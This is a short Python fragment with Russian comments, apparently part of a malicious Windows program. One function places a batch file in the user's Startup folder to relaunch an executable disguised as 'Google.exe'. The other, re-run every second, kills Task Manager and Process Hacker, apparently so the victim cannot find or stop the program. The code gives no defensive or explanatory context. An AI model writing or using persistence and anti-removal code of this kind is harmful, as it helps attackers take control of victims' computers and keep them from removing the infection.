def add_to_startup(exe_name):
    # Получаем имя пользователя
    # Путь к папке автозагрузки
    bat_path = os.path.join(
        r'C:\Users', USER_NAME, r'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    )

    # Ищем исполняемый файл в разных местах
    possible_locations = [
        os.path.join(r'C:\Users', USER_NAME, r'Desktop', exe_name),  # Рабочий стол
        os.path.join(r'C:\Users', USER_NAME, r'Documents', exe_name),  # Документы
        os.path.join(r'C:\Users', USER_NAME, r'Downloads',exe_name),
        os.path.join(r'C:\Program Files', exe_name),  # Программные файлы
        os.path.join(r'C:\Program Files (x86)', exe_name),  # Программные файлы (x86)
        # Добавьте другие пути, если нужно
    ]

    exe_path = None

    # Проверяем каждое возможное местоположение
    for location in possible_locations:
        if os.path.isfile(location):
            exe_path = location
            break

    if exe_path:
        # Создаем .bat файл в папке автозагрузки
        bat_file_path = os.path.join(bat_path, 'run.bat')

        with open(bat_file_path, 'w') as bat_file:
            bat_file.write(r'start "" "%s"' % exe_path)  # Оборачиваем путь к файлу в кавычки
# Пример использования функции
add_to_startup('Google.exe')

def openwindow():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == "processhacker.exe":
            proc.terminate()
            break
    # Проверяем, запущен ли процесс taskmgr.exe
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == "taskmgr.exe":
            proc.terminate()
            break
    window.after(1000,openwindow)

